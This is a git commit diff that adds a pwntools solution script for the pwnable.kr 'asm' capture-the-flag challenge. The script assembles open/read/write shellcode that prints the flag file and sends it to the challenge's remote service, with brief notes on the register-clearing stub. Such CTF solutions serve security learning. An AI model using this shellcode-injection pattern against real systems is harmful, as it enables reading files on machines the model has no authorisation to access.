ff6939f68464cca7586bdc4a433c2f23788655ab
Kasper Føns <kfoens@gmail.com>
2021-03-05 14:07:36 +0100

    Solved pwnable.kr asm challenge

--- pwnable.kr/asm/solution.py
+++ pwnable.kr/asm/solution.py
@@ -1,9 +1,35 @@
 #!/usr/bin/env python3
 from pwn import *
 
+"""
+Apparently, the stub is code is:
+    xor    rax,rax
+    xor    rbx,rbx
+    xor    rcx,rcx
+    xor    rdx,rdx
+    xor    rsi,rsi
+    xor    rdi,rdi
+    xor    rbp,rbp
+    xor    r8,r8
+    xor    r9,r9
+    xor    r10,r10
+    xor    r11,r11
+    xor    r12,r12
+    xor    r13,r13
+    xor    r14,r14
+    xor    r15,r15
+    nop
+
+I examined that first, which just showed that it clears the registers
+such that one cannot cheat.
+
+Thus, we just need to open, read and write the contents of the flag file
+"""
+
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('./asm')
 
+context.terminal = ["tmux", "splitw", "-h"]
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -14,9 +40,9 @@ exe = context.binary = ELF('./asm')
 def start():
     """Start the exploit against the target."""
     if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+        return gdb.debug([exe.path], gdbscript=gdbscript)
     elif args.LOCAL:
-        return process([exe.path] + argv, *a, **kw)
+        return process([exe.path])
     else:
         return remote('pwnable.kr', 9026)
 
@@ -25,7 +51,9 @@ def start():
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-tbreak main
+# Just before calling supplied shellcode
+break *(main+0x143)
+
 continue
 '''.format(**locals())
 
@@ -44,6 +72,17 @@ flag_filename = 'this_is_pwnable.kr_flag_file_please_read_' \
                 'ooooooooooooooooooooooooooooooo00000000000' \
                 '00000000000000ooooooooooooooooooooooo00000' \
                 '0000000o0o0o0o0o0o0ong'
+if args.LOCAL or args.GDB:
+    flag_filename = __file__  # read this file instead
+
 io = start()
 
-io.interactive()
+shellcode = asm(
+        shellcraft.open(flag_filename) +
+        shellcraft.read('rax', 'rsp', 0x1000) +
+        shellcraft.write(1, 'rsp', 'rax')
+    )
+
+io.recvuntil('give me your x64 shellcode: ')
+io.send(shellcode)
+success(io.recvall().decode('utf8'))
